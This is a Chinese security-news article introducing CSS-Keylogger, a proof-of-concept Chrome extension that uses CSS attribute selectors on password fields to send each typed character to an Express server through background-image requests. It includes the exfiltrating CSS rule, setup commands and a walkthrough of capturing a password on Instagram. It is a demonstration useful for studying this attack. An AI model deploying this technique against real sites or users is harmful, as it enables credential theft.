**今天给大家介绍的是一款名叫CSS-Keylogger的键盘记录工具，其实严格来说，它应该是一款Chrome插件，工具的使用还需要搭配Express服务器。**

![1.png](https://image.3001.net/images/20180228/15198238078132.png!small)  

## 工作机制

该工具的运行机制其实非常简单，它利用的是CSS属性收集器， 并且能够在加载网页背景图像的时候从外部服务器请求资源。

比如说，下面给出的这段CSS代码可以选择出所有type=“password”并且value值以“a”结尾的input输入框。接下来，它会尝试从<http://localhost:3000/a>加载一张图像。

    
    
    input[type="password"][value$="a"]{
      background-image:url("http://localhost:3000/a");
    }

我们只需要使用一个简单的脚本，就能够创建一个可以发送自定义请求（可包含任意ASCII字符）的css文件了。

脚本下载：【[传送门](https://github.com/maxchehab/CSS-Keylogging/blob/master/build.go)】

CSS文件获取：【[传送门](https://github.com/maxchehab/CSS-Keylogging/blob/master/css-keylogger-extension/keylogger.css)】

## 工具使用

### 设置Chrome扩展

1\. 使用下列命令将CSS-Keylogger代码库克隆到本地：

    
    
    git clone https://github.com/maxchehab/CSS-Keylogging

2\.
打开浏览器并访问chrome://extensions（或者通过点击浏览器右上角三个点的图标来打开Chrome菜单，进入“更多工具”并选择“扩展程序”）。

3\. 确保右上角的开发者模式选项已勾选。

4\. 点击“加载已解压的扩展程序…”。

5\. 选择你下载在本地的css-keylogger-extension目录。

![2.png](https://image.3001.net/images/20180228/15198238328978.png!small)  

### 设置Express服务器

    
    
    yarn
    yarn start

### 获取密码

1\. 打开一个使用了控制组件框架（例如React）的网站，例如<https://www.instagram.com/>；

2\. 打开网页之后，点击浏览器右上角的“C”字图标；

3\. 输入你的密码；

4\. 接下来，Express服务器将会捕捉到你所输入的密码；

  
![3.png](https://image.3001.net/images/20180228/1519823855816.png!small)  

就是这么简单！希望本工具可以给大家提供帮助或带来一些灵感。

## 工具下载

CSS-Keylogger：【[传送门](https://github.com/maxchehab/CSS-Keylogging)】

 *** 参考来源：[CSS-Keylogging](https://github.com/maxchehab/CSS-Keylogging)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

